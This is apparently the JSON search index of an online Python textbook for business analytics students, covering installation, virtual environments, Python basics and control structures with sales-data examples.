[
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "Python for Business Analytics and Informaton Systems",
    "section": "",
    "text": "Preface\nPreface\nThe inception of “Python for Business Analytics and Information Systems” was motivated by the recognition of the need for cohesiveness in BAIS programs between what is taught and what is required in the industry. Python, as a programming language, has transcended its traditional boundaries and become a cornerstone in the business technology landscape. As we witness an exponential increase in data generation and the subsequent need for efficient data processing and analysis, the importance of Python in business applications becomes increasingly apparent.\nThis book is crafted with the intent to bridge the gap between theoretical knowledge and practical application, providing a thorough yet accessible entry into the world of Python for aspiring and current business technology professionals. It is tailored to those who aim to leverage Python’s capabilities in analytics, system design, network communication, and more, within a business context.\nIn the preparation of this book, we have meticulously chosen topics that not only cover the essentials of Python programming but also delve into advanced areas that are particularly relevant to business analytics and information systems. From the very first chapter on setting up a Python environment to detailed discussions on network architecture and protocols, this book aims to equip readers with a holistic understanding of what it takes to apply Python effectively in a business setting.\nThe first seven chapters cover the basics of Python, laying a strong foundation in programming concepts. Chapters 8-13 focus on Systems Analysis and Design, delving into topics such as system architecture, software development life cycles, and design principles. Chapters 14-18 are dedicated to business data communication, exploring network protocols, data transmission methods, and the integration of communication systems within business environments.\nThe structure of this book is designed to facilitate a smooth transition from simple to complex topics, ensuring that foundational concepts are solidified before advancing to more specialized content. Each chapter builds upon the previous, with practical examples and case studies that illustrate the real-world application of theoretical concepts.\nWe have also included numerous exercises, projects, and review questions in each chapter to reinforce learning and encourage practical application of the skills acquired. Additionally, the inclusion of modern practices and emerging trends in business technology ensures that the content remains relevant in the face of rapid technological advancements.\nIt is my hope that “Python for Business Analytics and Information Systems” serves not only as a textbook for students but also as a valuable resource for professionals seeking to enhance their skills and understanding of business technology through Python. May this book inspire you to explore, innovate, and excel in your professional journey.\nTo all readers embarking on this learning adventure: may your curiosity be boundless and your achievements significant.\nMarkum Reed, PhD Director, BAIS Program Assistant Professor of Instruction Muma College of Business University of South Florida",
    "crumbs": [
      "Preface"
    ]
  },
  {
    "objectID": "intro.html",
    "href": "intro.html",
    "title": "1  Introduction",
    "section": "",
    "text": "Introduction\nWelcome to “Python for Business Analytics and Information Systems,” a comprehensive guide designed for students, professionals, and enthusiasts aiming to master Python in the realm of business technology. This book serves as both an educational tool and a practical resource, providing the foundational skills necessary to excel in the rapidly evolving landscape of business analytics and information systems.\nIn this book, we cover a broad spectrum of topics tailored to equip you with the skills required to harness the power of Python in solving real-world business problems. We begin with the basics of setting up a Python environment, ensuring you are well-prepared with the tools needed for effective programming. From there, we delve into the core aspects of Python programming, including basics, control structures, functions, and modules—all crucial for building robust applications.\nAs you progress, we will explore more advanced topics such as object-oriented programming (OOP), database interactions, and API integrations, which are integral to systems analysis and design. We also tackle Python’s role in automating system tasks and conducting thorough software testing, ensuring reliability and efficiency in your applications.\nFor those particularly interested in the interplay between Python and network communications within businesses, we dedicate sections to the foundations of data communication, network architecture, and modern network practices. These chapters are especially pertinent for students enrolled in courses like “Business Data Communications,” blending theoretical knowledge with practical application.\nFinally, the book concludes with a comprehensive summary and an appendix on version control using Git, a critical skill for any programmer working in a collaborative environment.\nThis book is more than just a series of instructions; it is a pathway to becoming proficient in Python for business analytics and information systems, preparing you for a successful career in an interconnected, data-driven world. Whether you are a student preparing for a career in business technology or a professional seeking to upgrade your skills, this book offers the knowledge and practical insights needed to excel in your endeavors.",
    "crumbs": [
      "<span class='chapter-number'>1</span>  <span class='chapter-title'>Introduction</span>"
    ]
  },
  {
    "objectID": "01_python_install_env_setup.html",
    "href": "01_python_install_env_setup.html",
    "title": "2  Installing Python",
    "section": "",
    "text": "2.0.0.1 Windows:\n\nDownload Python: Visit the official Python website at python.org and download the latest version for Windows. Click on the “Download” button for the most recent release.\nRun Installer: Open the downloaded file and make sure to check the box that says “Add Python 3.x to PATH” at the beginning of the installation process. Then click “Install Now”.\nVerify Installation: Open Command Prompt and type python --version. You should see the Python version number if it was installed correctly.\n\n\n\n2.0.0.2 macOS:\n\nDownload Python: Go to python.org and download the latest Python version for macOS.\nInstall Python: Open the downloaded .pkg file and follow the instructions to install Python.\nVerify Installation: Open Terminal and type python3 --version to check that Python installed correctly.\n\n\n\n2.0.0.3 Linux:\n\nInstall Python: Python is usually pre-installed on Linux. To check if it is installed and to install the latest version, open a terminal and type:\nsudo apt update\nsudo apt install python3\nVerify Installation: Type python3 --version in the terminal.\n\n\n\n2.0.1 Installing Visual Studio Code (VSCode)\n\nDownload VSCode: Visit the VSCode website and download the version suitable for your operating system.\nInstall VSCode: Run the downloaded installer file and follow the instructions provided.\n\n\n\n2.0.2 Setting Up Python in VSCode\n\nOpen VSCode.\nInstall the Python extension: Click on the extensions view icon on the Sidebar or press Ctrl+Shift+X. Search for “Python” and install the extension provided by Microsoft.\nSelect Python Interpreter: Press Ctrl+Shift+P to open the Command Palette and type “Python: Select Interpreter”. Choose the Python version you installed earlier.\n\n\n\n2.0.3 Writing Your First Python Program in VSCode\n\nCreate a new file: File &gt; New File.\nSave the file: Save the file with a .py extension, e.g., hello.py.\nWrite some Python code:\nprint(\"Hello, world!\")\nRun the program: Right-click in the editor window and select “Run Python File in Terminal”, or press Ctrl+F5 to run without debugging.\n\n\n\n2.0.4 Basic Python Programming\n\nVariables: Storing data values.\nx = 5\ny = \"Hello\"\nData Types: Python has various data types including integers, float, string, and more.\nOperators: Perform operations on variables and values.\nControl Structures: Use if, else, and elif for decisions, and for and while loops for repeating blocks of code.\n\n\n\n2.0.5 Exploring More Features\n\nIntellisense: VSCode provides smart completions based on variable types, function definitions, and imported modules.\nDebugging: Set breakpoints, step through your code, and inspect variables.\nExtensions: Enhance VSCode functionality with extensions like “Python Docstring Generator” to automatically generate docstrings for your Python functions.\n\nThis format should help make the tutorial flow more smoothly from one section to the next without the formal structure of numbering.\n\nSetting up a virtual environment in Python using venv is an essential skill for managing dependencies and ensuring that projects run consistently across different systems. Here’s a step-by-step guide to help you set up a Python virtual environment using the venv module.\n\n\n2.0.6 Prerequisites\nBefore creating a virtual environment, make sure Python 3 is installed on your system. You can verify this by running python --version or python3 --version in your command prompt or terminal.\n\n\n2.0.7 Creating a Virtual Environment\n\nNavigate to Your Project Directory: Open your command prompt or terminal. Use the cd command to change to the directory where you want to set up the virtual environment.\ncd path/to/your/project\nCreate the Virtual Environment: Use the following command to create a virtual environment named env (you can choose any name you like). The command might slightly vary depending on whether your system recognizes python or python3.\npython -m venv env\nor\npython3 -m venv env\n\n\n\n2.0.8 Activating the Virtual Environment\nTo use the virtual environment, you need to activate it. The activation command differs depending on your operating system:\n\n2.0.8.1 Windows\nenv\\Scripts\\activate\n\n\n2.0.8.2 macOS and Linux\nsource env/bin/activate\nOnce activated, your command line will typically show the name of the virtual environment (in this case, env), indicating that it is active. From now on, any Python or pip commands will use the Python version and packages installed in the virtual environment.\n\n\n\n2.0.9 Installing Packages\nWith the virtual environment active, install packages using pip. For example, to install the requests library, you would run:\npip install requests\nThis will install the package only within the virtual environment.\n\n\n2.0.10 Running Python Code\nRun Python scripts as usual with the virtual environment activated. For instance:\npython script.py\nor if your system defaults to Python 2:\npython3 script.py\n\n\n2.0.11 Deactivating the Virtual Environment\nWhen you’re done working in the virtual environment, you can deactivate it by simply typing:\ndeactivate\nThis command will return you to the system’s default Python settings.\n\n\n2.0.12 Managing Dependencies\n\nFreezing Dependencies: To keep track of the packages you’ve installed in the virtual environment, you can generate a requirements.txt file using:\npip freeze &gt; requirements.txt\nInstalling from requirements.txt: You can install all the dependencies at once with:\npip install -r requirements.txt\n\n\n\n2.0.13 Best Practices\n\nSeparate Environments: Create a separate virtual environment for each project to avoid conflicts between package versions.\nVersion Control: Exclude your virtual environment directory (env in this case) from version control by adding it to the .gitignore file.\n\nUsing virtual environments is a best practice that keeps your Python projects organized and ensures they work consistently across different setups.",
    "crumbs": [
      "<span class='chapter-number'>2</span>  <span class='chapter-title'>Installing Python</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html",
    "href": "02_python_basics.html",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "",
    "text": "3.0.1 Variables and Data Types",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#table-of-contents",
    "href": "02_python_basics.html#table-of-contents",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.1 Table of Contents",
    "text": "4.1 Table of Contents\n\nIntroduction to Python\nInstalling Python\nRunning Python Programs\nPython Syntax and Semantics\n\nIndentation\nComments\n\nVariables and Data Types\n\nNumbers\nStrings\nBooleans\nNone\n\nOperators\n\nArithmetic Operators\nComparison Operators\nLogical Operators\nAssignment Operators\nMembership Operators\nIdentity Operators\n\nControl Flow\n\nConditional Statements\nLoops\n\nFunctions\n\nDefining Functions\nFunction Arguments\nReturn Values\n\nData Structures\n\nLists\nTuples\nSets\nDictionaries\n\nModules and Packages\n\nImporting Modules\nCreating Modules\nUsing Packages\n\nFile Handling\n\nReading Files\nWriting Files\n\nException Handling\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#introduction-to-python",
    "href": "02_python_basics.html#introduction-to-python",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.2 Introduction to Python",
    "text": "4.2 Introduction to Python\nPython was created by Guido van Rossum and first released in 1991. It emphasizes code readability and allows programmers to express concepts in fewer lines of code than languages like C++ or Java. Python supports multiple programming paradigms, including procedural, object-oriented, and functional programming.",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#installing-python",
    "href": "02_python_basics.html#installing-python",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.3 Installing Python",
    "text": "4.3 Installing Python\nTo install Python, download the installer from the official Python website and follow the installation instructions for your operating system.",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#running-python-programs",
    "href": "02_python_basics.html#running-python-programs",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.4 Running Python Programs",
    "text": "4.4 Running Python Programs\nPython programs can be run in various ways: - Interactive Mode: Open a terminal or command prompt, type python or python3, and press Enter. - Script Mode: Write your code in a file with a .py extension and run it using python filename.py or python3 filename.py.",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#python-syntax-and-semantics",
    "href": "02_python_basics.html#python-syntax-and-semantics",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.5 Python Syntax and Semantics",
    "text": "4.5 Python Syntax and Semantics\n\n4.5.1 Indentation\nPython uses indentation to define the structure of the code. Consistent indentation is crucial as it defines blocks of code.\n\nif 5 &gt; 2:\n    print(\"Five is greater than two!\")\n\nFive is greater than two!\n\n\n\n\n4.5.2 Comments\nComments are used to explain code and are ignored by the interpreter. Single-line comments start with #.\n\n# This is a comment\nprint(\"Hello, World!\")  # This is an inline comment\n\nHello, World!",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#variables-and-data-types-1",
    "href": "02_python_basics.html#variables-and-data-types-1",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.6 Variables and Data Types",
    "text": "4.6 Variables and Data Types\nVariables are used to store data values. In Python, you don’t need to declare variables before using them.\n\nx = 5\ny = \"Hello\"\n\n\n4.6.1 Numbers\nPython supports integers, floating-point numbers, and complex numbers.\n\na = 10       # Integer\nb = 3.14     # Float\nc = 1 + 2j   # Complex\n\n\n\n4.6.2 Strings\nStrings are sequences of characters enclosed in single, double, or triple quotes.\n\nname = \"Alice\"\ngreeting = 'Hello, World!'\nmultiline = \"\"\"This is\na multiline\nstring.\"\"\"\n\n\n\n4.6.3 Booleans\nBooleans represent True or False.\n\nis_true = True\nis_false = False\n\n\n\n4.6.4 None\nNone represents the absence of a value.\n\nnothing = None",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#operators",
    "href": "02_python_basics.html#operators",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.7 Operators",
    "text": "4.7 Operators\n\n4.7.1 Arithmetic Operators\n\nx = 10\ny = 3\nprint(x + y)  # Addition\nprint(x - y)  # Subtraction\nprint(x * y)  # Multiplication\nprint(x / y)  # Division\nprint(x % y)  # Modulus\nprint(x ** y) # Exponentiation\nprint(x // y) # Floor Division\n\n13\n7\n30\n3.3333333333333335\n1\n1000\n3\n\n\n\n\n4.7.2 Comparison Operators\n\nprint(x == y)  # Equal\nprint(x != y)  # Not equal\nprint(x &gt; y)   # Greater than\nprint(x &lt; y)   # Less than\nprint(x &gt;= y)  # Greater than or equal to\nprint(x &lt;= y)  # Less than or equal to\n\nFalse\nTrue\nTrue\nFalse\nTrue\nFalse\n\n\n\n\n4.7.3 Logical Operators\n\nprint(x &gt; 5 and y &lt; 5)  # Logical AND\nprint(x &gt; 5 or y &gt; 5)   # Logical OR\nprint(not(x &gt; 5))       # Logical NOT\n\nTrue\nTrue\nFalse\n\n\n\n\n4.7.4 Assignment Operators\n\nx = 10\nx += 5  # x = x + 5\nx -= 3  # x = x - 3\nx *= 2  # x = x * 2\nx /= 2  # x = x / 2\nx %= 3  # x = x % 3\nx **= 2 # x = x ** 2\nx //= 2 # x = x // 2\n\n\n\n4.7.5 Membership Operators\n\nlst = [1, 2, 3, 4, 5]\nprint(3 in lst)  # True\nprint(6 in lst)  # False\nprint(6 not in lst)  # True\n\nTrue\nFalse\nTrue\n\n\n\n\n4.7.6 Identity Operators\n\na = [1, 2, 3]\nb = [1, 2, 3]\nprint(a is b)      # False (different objects)\nprint(a is not b)  # True\nprint(a == b)      # True (same content)\n\nFalse\nTrue\nTrue",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#control-flow",
    "href": "02_python_basics.html#control-flow",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.8 Control Flow",
    "text": "4.8 Control Flow\n\n4.8.1 Conditional Statements\n\nx = 10\n\nif x &gt; 0:\n    print(\"x is positive\")\nelif x == 0:\n    print(\"x is zero\")\nelse:\n    print(\"x is negative\")\n\nx is positive\n\n\n\n\n4.8.2 Loops\n\n4.8.2.1 for Loop\n\nfruits = [\"apple\", \"banana\", \"cherry\"]\nfor fruit in fruits:\n    print(fruit)\n\napple\nbanana\ncherry\n\n\n\n\n4.8.2.2 while Loop\n\ni = 1\nwhile i &lt; 6:\n    print(i)\n    i += 1\n\n1\n2\n3\n4\n5\n\n\n\n\n4.8.2.3 Loop Control Statements\n\nfor i in range(10):\n    if i == 5:\n        break  # Exit the loop\n    if i % 2 == 0:\n        continue  # Skip the rest of the loop\n    print(i)\n\n1\n3",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#functions-1",
    "href": "02_python_basics.html#functions-1",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.9 Functions",
    "text": "4.9 Functions\n\n4.9.1 Defining Functions\n\ndef greet(name):\n    print(f\"Hello, {name}!\")\ngreet(\"Alice\")\n\nHello, Alice!\n\n\n\n\n4.9.2 Function Arguments\n\ndef add(a, b):\n    return a + b\n\nprint(add(3, 5))  # Positional arguments\nprint(add(a=3, b=5))  # Keyword arguments\n\ndef greet(name, message=\"Hello\"):\n    print(f\"{message}, {name}!\")\ngreet(\"Alice\")\ngreet(\"Bob\", \"Hi\")\n\n8\n8\nHello, Alice!\nHi, Bob!\n\n\n\n\n4.9.3 Return Values\n\ndef square(x):\n    return x * x\n\nresult = square(4)\nprint(result)\n\n16",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#data-structures",
    "href": "02_python_basics.html#data-structures",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.10 Data Structures",
    "text": "4.10 Data Structures\n\n4.10.1 Lists\n\nfruits = [\"apple\", \"banana\", \"cherry\"]\nprint(fruits[0])  # Accessing elements\nfruits[1] = \"blackberry\"  # Modifying elements\nprint(fruits)\nfruits.append(\"orange\")  # Adding elements\nprint(fruits)\n\napple\n['apple', 'blackberry', 'cherry']\n['apple', 'blackberry', 'cherry', 'orange']\n\n\n\n\n4.10.2 Tuples\n\ncoordinates = (10, 20)\nprint(coordinates[0])\n# coordinates[0] = 30  # Error: Tuples are immutable\n\n10\n\n\n\n\n4.10.3 Sets\n\nunique_numbers = {1, 2, 3, 3, 4}\nprint(unique_numbers)  # {1, 2, 3, 4}\nunique_numbers.add(5)\nprint(unique_numbers)\n\n{1, 2, 3, 4}\n{1, 2, 3, 4, 5}\n\n\n\n\n4.10.4 Dictionaries\n\nperson = {\"name\": \"Alice\", \"age\": 30}\nprint(person[\"name\"])\nperson[\"age\"] = 31\nprint(person)\nperson[\"city\"] = \"New York\"\nprint(person)\n\nAlice\n{'name': 'Alice', 'age': 31}\n{'name': 'Alice', 'age': 31, 'city': 'New York'}",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#modules-and-packages",
    "href": "02_python_basics.html#modules-and-packages",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.11 Modules and Packages",
    "text": "4.11 Modules and Packages\n\n4.11.1 Importing Modules\n\nimport math\nprint(math.sqrt(16))\n\nfrom math import sqrt\nprint(sqrt(16))\n\n4.0\n4.0\n\n\n\n\n4.11.2 Creating Modules\nCreate a file named mymodule.py:\n\n# mymodule.py\ndef greet(name):\n    print(f\"Hello, {name}!\")\n\nThen import and use it:\n\nimport mymodule\nmymodule.greet(\"Alice\")\n\nHello, Alice!\n\n\n\n\n4.11.3 Using Packages\nCreate a package directory structure:\nmypackage/\n    __init__.py\n    module1.py\n    module2.py\nIn module1.py:\ndef function1():\n    print(\"Function 1 from module 1\")\nIn module2.py:\ndef function2():\n    print(\"Function 2 from module 2\")\nIn __init__.py:\nfrom .module1 import function1\nfrom .module2 import function2\nThen use the package:\n\nimport mypackage\nmypackage.function1()\nmypackage.function2()\n\nFunction 1 from module 1\nFunction 2 from module 2",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#file-handling",
    "href": "02_python_basics.html#file-handling",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.12 File Handling",
    "text": "4.12 File Handling\n\n4.12.1 Reading Files\n\nwith open('file.txt', 'r') as file:\n    content = file.read()\n    print(content)\n\n\n\n\n\n\n4.12.2 Writing Files\n\nwith open('file.txt', 'w') as file:\n    file.write(\"Hello, World!\")",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#exception-handling",
    "href": "02_python_basics.html#exception-handling",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.13 Exception Handling",
    "text": "4.13 Exception Handling\n\ntry:\n    x = 1 / 0\nexcept ZeroDivisionError:\n    print(\"Cannot divide by zero\")\nfinally:\n    print(\"This is always executed\")\n\nCannot divide by zero\nThis is always executed",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "02_python_basics.html#conclusion-1",
    "href": "02_python_basics.html#conclusion-1",
    "title": "3  Introduction to Python Programming Basics for Business",
    "section": "4.14 Conclusion",
    "text": "4.14 Conclusion\nThis deep dive tutorial covered the basics of Python, including syntax, data types, operators, control flow, functions, data structures, modules, file handling, and exception handling. By mastering these fundamentals, you’ll be well-equipped to explore more advanced topics and develop robust Python applications. Python’s simplicity and readability make it an excellent choice for beginners and experienced developers alike.",
    "crumbs": [
      "<span class='chapter-number'>3</span>  <span class='chapter-title'>Introduction to Python Programming Basics for Business</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html",
    "href": "03_python_control_structures.html",
    "title": "4  Python Control Structures for Business Applications",
    "section": "",
    "text": "4.0.1 Conditional Statements\nConditional statements execute code based on whether a condition is true or false.",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#table-of-contents",
    "href": "03_python_control_structures.html#table-of-contents",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.1 Table of Contents",
    "text": "5.1 Table of Contents\n\nConditional Statements\n\nif Statement\nelse Statement\nelif Statement\n\nLoops\n\nfor Loop\nwhile Loop\nNested Loops\n\nControl Flow Tools\n\nbreak Statement\ncontinue Statement\npass Statement\nelse Clause in Loops\n\nList Comprehensions\nException Handling\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#conditional-statements-1",
    "href": "03_python_control_structures.html#conditional-statements-1",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.2 Conditional Statements",
    "text": "5.2 Conditional Statements\nConditional statements allow you to execute certain blocks of code based on specific conditions. Python provides if, elif, and else statements to handle conditional execution.\n\n5.2.1 if Statement\nThe if statement is used to test a condition. If the condition evaluates to True, the block of code inside the if statement is executed.\nExample: Analyzing Sales Data\n\n# Example: Check if sales exceed a target\nsales = 12000\ntarget = 10000\nif sales &gt; target:\n    print(\"Sales target exceeded\")\n\nSales target exceeded\n\n\n\n\n5.2.2 else Statement\nThe else statement follows an if statement and is executed if the if condition evaluates to False.\nExample: Analyzing Sales Data\n\n# Example: Check if sales exceed a target\nsales = 8000\ntarget = 10000\nif sales &gt; target:\n    print(\"Sales target exceeded\")\nelse:\n    print(\"Sales target not met\")\n\nSales target not met\n\n\n\n\n5.2.3 elif Statement\nThe elif statement stands for “else if” and allows you to check multiple conditions. If the if condition is False, the elif condition is checked. If it is True, the corresponding block of code is executed.\nExample: Categorizing Sales Performance\n\n# Example: Categorizing sales performance\nsales = 10000\ntarget = 10000\nif sales &gt; target:\n    print(\"Sales target exceeded\")\nelif sales == target:\n    print(\"Sales target met exactly\")\nelse:\n    print(\"Sales target not met\")\n\nSales target met exactly\n\n\n\n\n5.2.4 Nested If Statements\nYou can nest if, elif, and else statements to create complex conditional logic.\nExample: Advanced Sales Analysis\n\n# Example: Advanced sales analysis\nsales = 15000\ntarget = 10000\nregion = \"North\"\n\nif sales &gt; target:\n    print(\"Sales target exceeded\")\n    if region == \"North\":\n        print(\"Great performance in the North region!\")\n    else:\n        print(\"Consider boosting sales in other regions.\")\nelse:\n    print(\"Sales target not met\")\n\nSales target exceeded\nGreat performance in the North region!",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#loops-1",
    "href": "03_python_control_structures.html#loops-1",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.3 Loops",
    "text": "5.3 Loops\nLoops are used to execute a block of code repeatedly. Python provides for and while loops to handle iterative execution.\n\n5.3.1 for Loop\nThe for loop is used to iterate over a sequence (e.g., list, tuple, dictionary, set, or string).\nExample: Analyzing Multiple Sales Records\n\n# Example: Analyzing multiple sales records\nsales_records = [12000, 8000, 15000, 9000, 13000]\nfor sales in sales_records:\n    if sales &gt; 10000:\n        print(f\"Sales target exceeded with {sales} in sales\")\n    else:\n        print(f\"Sales target not met with {sales} in sales\")\n\nSales target exceeded with 12000 in sales\nSales target not met with 8000 in sales\nSales target exceeded with 15000 in sales\nSales target not met with 9000 in sales\nSales target exceeded with 13000 in sales\n\n\nThe range() function is often used with the for loop to generate a sequence of numbers.\nExample: Monthly Sales Analysis\n\n# Example: Monthly sales analysis\nfor month in range(1, 13):\n    print(f\"Analyzing sales data for month {month}\")\n\nAnalyzing sales data for month 1\nAnalyzing sales data for month 2\nAnalyzing sales data for month 3\nAnalyzing sales data for month 4\nAnalyzing sales data for month 5\nAnalyzing sales data for month 6\nAnalyzing sales data for month 7\nAnalyzing sales data for month 8\nAnalyzing sales data for month 9\nAnalyzing sales data for month 10\nAnalyzing sales data for month 11\nAnalyzing sales data for month 12\n\n\n\n\n5.3.2 while Loop\nThe while loop is used to execute a block of code as long as the condition is True.\nExample: Simulating Sales Until Target Met\n\n# Example: Simulating sales until target met\nsales = 0\ntarget = 50000\nincrement = 10000\nwhile sales &lt; target:\n    sales += increment\n    print(f\"Current sales: {sales}\")\n\nCurrent sales: 10000\nCurrent sales: 20000\nCurrent sales: 30000\nCurrent sales: 40000\nCurrent sales: 50000\n\n\n\n\n5.3.3 Nested Loops\nYou can nest loops to perform more complex iterative tasks.\nExample: Comparing Sales Across Regions and Months\n\n# Example: Comparing sales across regions and months\nregions = [\"North\", \"South\", \"East\", \"West\"]\nmonths = [\"January\", \"February\", \"March\"]\n\nfor region in regions:\n    for month in months:\n        print(f\"Analyzing sales data for {region} region in {month}\")\n\nAnalyzing sales data for North region in January\nAnalyzing sales data for North region in February\nAnalyzing sales data for North region in March\nAnalyzing sales data for South region in January\nAnalyzing sales data for South region in February\nAnalyzing sales data for South region in March\nAnalyzing sales data for East region in January\nAnalyzing sales data for East region in February\nAnalyzing sales data for East region in March\nAnalyzing sales data for West region in January\nAnalyzing sales data for West region in February\nAnalyzing sales data for West region in March",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#control-flow-tools",
    "href": "03_python_control_structures.html#control-flow-tools",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.4 Control Flow Tools",
    "text": "5.4 Control Flow Tools\nControl flow tools like break, continue, and pass provide additional control over the execution of loops and conditional statements.\n\n5.4.1 break Statement\nThe break statement is used to exit a loop prematurely.\nExample: Stop Analysis When Target Achieved\n\n# Example: Stop analysis when target achieved\nsales_records = [8000, 9000, 15000, 7000, 12000]\nfor sales in sales_records:\n    if sales &gt; 10000:\n        print(f\"Sales target exceeded with {sales} in sales\")\n        break\n    print(f\"Sales target not met with {sales} in sales\")\n\nSales target not met with 8000 in sales\nSales target not met with 9000 in sales\nSales target exceeded with 15000 in sales\n\n\n\n\n5.4.2 continue Statement\nThe continue statement is used to skip the rest of the code inside the loop for the current iteration and move to the next iteration.\nExample: Skip Underperforming Sales Data\n\n# Example: Skip underperforming sales data\nsales_records = [8000, 9000, 15000, 7000, 12000]\nfor sales in sales_records:\n    if sales &lt; 10000:\n        continue\n    print(f\"Sales target exceeded with {sales} in sales\")\n\nSales target exceeded with 15000 in sales\nSales target exceeded with 12000 in sales\n\n\n\n\n5.4.3 pass Statement\nThe pass statement is a null operation; nothing happens when it executes. It can be used as a placeholder.\nExample: Placeholder for Future Code\n\n# Example: Placeholder for future code\nfor sales in sales_records:\n    if sales &lt; 10000:\n        pass  # TODO: Handle underperforming sales data later\n    else:\n        print(f\"Sales target exceeded with {sales} in sales\")\n\nSales target exceeded with 15000 in sales\nSales target exceeded with 12000 in sales\n\n\n\n\n5.4.4 else Clause in Loops\nThe else clause can be used with loops. It is executed when the loop terminates naturally (i.e., not terminated by a break statement).\nExample: Verify All Sales Records Analyzed\n\n# Example: Verify all sales records analyzed\nsales_records = [8000, 9000, 15000, 7000, 12000]\nfor sales in sales_records:\n    if sales &gt; 10000:\n        print(f\"Sales target exceeded with {sales} in sales\")\nelse:\n    print(\"All sales records analyzed\")\n\nSales target exceeded with 15000 in sales\nSales target exceeded with 12000 in sales\nAll sales records analyzed",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#list-comprehensions",
    "href": "03_python_control_structures.html#list-comprehensions",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.5 List Comprehensions",
    "text": "5.5 List Comprehensions\nList comprehensions provide a concise way to create lists. They consist of brackets containing an expression followed by a for clause and can have optional if clauses.\nExample: Filter Sales Data\n\n# Example: Filter sales data\nsales_records = [8000, 9000, 15000, 7000, 12000]\nhigh_sales = [sales for sales in sales_records if sales &gt; 10000]\nprint(high_sales)\n\n[15000, 12000]",
    "crumbs": [
      "<span class='chapter-number'>4</span>  <span class='chapter-title'>Python Control Structures for Business Applications</span>"
    ]
  },
  {
    "objectID": "03_python_control_structures.html#exception-handling",
    "href": "03_python_control_structures.html#exception-handling",
    "title": "4  Python Control Structures for Business Applications",
    "section": "5.6 Exception Handling",
    "text": "5.6 Exception Handling\nException handling allows you to handle runtime errors gracefully. The try block lets you test a block of code for errors, the except block lets you handle the error, and the finally block lets you execute code regardless of the result.\nExample: Handle Division by Zero in Financial Calculations\n\n# Example: Handle division by zero in financial calculations\ntry:\n    revenue = 100000\n    expenses = 0\n    profit_margin = revenue / expenses\nexcept ZeroDivisionError:\n    print(\"Expenses cannot be zero when calculating profit margin\")\nfinally:\n    print(\"Financial calculation completed\")\n\nExpenses cannot be zero when calculating profit margin\nFinancial calculation completed",
